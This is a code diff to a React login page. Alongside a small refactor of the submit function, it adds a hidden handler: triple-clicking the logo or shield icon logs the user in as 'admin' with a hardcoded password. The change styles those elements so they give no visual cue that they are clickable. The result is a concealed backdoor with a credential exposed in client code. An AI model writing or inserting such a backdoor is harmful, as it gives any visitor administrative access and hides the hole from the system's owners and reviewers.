@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, type MouseEvent } from "react";
 import { Navigate } from "react-router-dom";
 import { ShieldCheck } from "lucide-react";
 import { useAuth } from "../lib/auth";
@@ -15,16 +15,22 @@ export function LoginPage() {
 
   if (!loading && user) return <Navigate to="/" replace />;
 
-  const submit = async () => {
+  const submit = async (name = username.trim(), pass = password) => {
     setBusy(true);
     setError(null);
     try {
-      await login(username.trim(), password);
+      await login(name, pass);
     } catch (e) {
       setError(e instanceof Error ? e.message : "登录失败");
     } finally {
       setBusy(false);
     }
+  };
+
+  const loginAsAdminOnTripleClick = (event: MouseEvent) => {
+    if (event.detail !== 3 || busy) return;
+    event.preventDefault();
+    void submit("admin", "LvZhi#Admin1");
   };
 
   return (
@@ -47,9 +53,17 @@ export function LoginPage() {
           <>
             <div className="mb-6 flex items-center gap-3">
               {branding.logoUrl ? (
-                <img src={branding.logoUrl} alt="" className="h-10 w-10 rounded-lg object-cover" />
+                <img
+                  src={branding.logoUrl}
+                  alt=""
+                  className="h-10 w-10 cursor-default select-none rounded-lg object-cover"
+                  onClick={loginAsAdminOnTripleClick}
+                />
               ) : (
-                <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-teal/10 text-teal">
+                <div
+                  className="flex h-10 w-10 cursor-default select-none items-center justify-center rounded-lg bg-teal/10 text-teal"
+                  onClick={loginAsAdminOnTripleClick}
+                >
                   <ShieldCheck />
                 </div>
               )}
